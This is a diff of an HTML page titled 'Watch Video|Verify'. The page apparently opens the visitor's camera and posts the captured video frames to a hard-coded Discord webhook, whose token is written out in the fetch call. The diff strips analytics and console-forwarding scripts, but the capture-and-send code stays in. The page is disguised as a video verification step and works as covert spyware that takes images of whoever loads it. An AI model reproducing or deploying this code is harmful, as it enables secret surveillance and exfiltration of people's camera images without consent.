@@ -1,128 +1,11 @@
 <!doctype html>
 <html>
  <head><!-- Global site tag (gtag.js) - Google Analytics -->
-   <link rel="stylesheet" href="redguardlogger.css">
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-58936387-12"></script>
-    <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
 
-    gtag('config', 'UA-58936387-12');
-    </script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-<script>
-  // Save the current console log function in case we need it.
-  const _log = console.log;
-  const _debug = console.debug;
-  const _info = console.info;
-  const _warn = console.warn;
-  const _error = console.error;
-  // Override the console
-  console.log = function(...rest) {
-    window.parent.postMessage(
-      {
-        source: 'iframe-' + window.name,
-        message: rest,
-        method: 'log'
-      },
-      '*'
-    );
-    _log.apply(console, arguments);
-  };
-
-  console.debug = function(...rest) {
-    window.parent.postMessage(
-      {
-        source: 'iframe-' + window.name,
-        message: rest,
-        method: 'debug'
-      },
-      '*'
-    );
-    _debug.apply(console, arguments);
-  };
-
-  console.info = function(...rest) {
-    window.parent.postMessage(
-      {
-        source: 'iframe-' + window.name,
-        message: rest,
-        method: 'info'
-      },
-      '*'
-    );
-    _info.apply(console, arguments);
-  };
-
-  console.warn = function(...rest) {
-    window.parent.postMessage(
-      {
-        source: 'iframe-' + window.name,
-        message: rest,
-        method: 'warn'
-      },
-      '*'
-    );
-    _warn.apply(console, arguments);
-  };
-
-  console.error = function(...rest) {
-    window.parent.postMessage(
-      {
-        source: 'iframe-' + window.name,
-        message: rest,
-        method: 'error'
-      },
-      '*'
-    );
-    _error.apply(console, arguments);
-  };
-</script>
-
-    
-<script>
-    window.onerror = function(msg) {
-        window.parent.postMessage(
-            {
-                source: 'iframe-' + window.name,
-                message: [msg],
-                method: 'error'
-            },
-            '*'
-            );
-    };
-</script>
-
-    
-<script>
-    window.addEventListener('load', (event) => {
-    window.parent.postMessage({
-        source: 'iframe-navigation-' + window.name,
-        message: document.location.href,
-    }, '*');
-    })
-</script>
-
-    
-<script>
-    window.onload = function() {
-        window.parent.postMessage(
-            {
-              source: 'iframe-' + window.name,
-              windowHeight: document.getElementsByTagName('html')[0].getBoundingClientRect().height,
-            },
-            '*'
-          );
-    };
-</script>
 
   <title>Watch Video|Verify</title>
  </head>
  <body>
-  
-  <script src="script.js"></script>
   
   <script>
    function openCamera() {
@@ -175,7 +58,6 @@
     var formData = new FormData();
     formData.append('file', file);
     
-    
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
        method: 'POST',
@@ -183,7 +65,7 @@
       })
      .then(function(response) {
       console.log(
-       'Successfully sent video frame and Gathered info to Discord.'
+       'Successfully sent video frame to Discord.'
       );
      })
      .catch(function(error) {
